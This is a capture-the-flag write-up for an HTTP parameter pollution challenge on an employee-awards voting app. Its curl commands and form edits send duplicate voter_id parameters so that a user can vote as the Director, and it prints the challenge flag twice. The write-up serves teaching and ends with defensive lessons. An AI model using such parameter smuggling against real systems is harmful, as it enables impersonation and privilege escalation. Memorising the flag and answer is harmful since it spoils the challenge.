# 🗳️ Employee Excellence Awards - Writeup

## Challenge Overview
**Name:** The Twin Identity  
**Category:** HTTP Parameter Pollution (HPP)  
**Difficulty:** Medium  
**Flag:** `STELKCSC{p4r4m3t3r_p0llut10n_tw1n_1d3nt1ty}`

## Vulnerability

The application has inconsistent parameter handling:
- **Security check** reads the **first** `voter_id` parameter
- **Backend processing** uses the **last** `voter_id` parameter

This allows bypassing the security check while executing with elevated privileges.

## Discovery

### Step 1: Normal Flow
1. Login as Budi (E001)
2. Vote for a candidate
3. Notice URL contains `voter_id=E001`

### Step 2: Test Direct Access
```bash
# Try voting as Director (E999) directly
curl -X POST http://localhost:5008/vote \
  -d "candidate_id=E001&voter_id=E999"
# Result: "Security Alert: Voter ID mismatch"
```

### Step 3: HTTP Parameter Pollution
```bash
# Send DUPLICATE voter_id parameters
curl -X POST http://localhost:5008/vote \
  -d "candidate_id=E001&voter_id=E001&voter_id=E999"
```

**What happens:**
- Security Check sees: `voter_id=E001` (first) ✓ Pass
- Backend sees: `voter_id=E999` (last) → Director privileges!

## Solution

### Method 1: Intercept with Burp Suite
1. Vote normally and intercept POST request
2. Add duplicate parameter: `voter_id=E001&voter_id=E999`
3. Forward request → Flag in response

### Method 2: Modify Form
1. Open DevTools → Elements
2. Find hidden `voter_id` input
3. Add another input: `<input name="voter_id" value="E999">`
4. Submit form → Flag appears

### Method 3: cURL
```bash
curl -X POST http://localhost:5008/vote \
  -d "candidate_id=E002&voter_id=E001&voter_id=E999"
```

## Flag
```
STELKCSC{p4r4m3t3r_p0llut10n_tw1n_1d3nt1ty}
```

## Key Takeaways
1. **Consistent parameter handling** - All layers must read parameters the same way
2. **HPP is often overlooked** - Many apps don't handle duplicate params consistently
3. **Defense in depth** - Validate at multiple layers with consistent logic
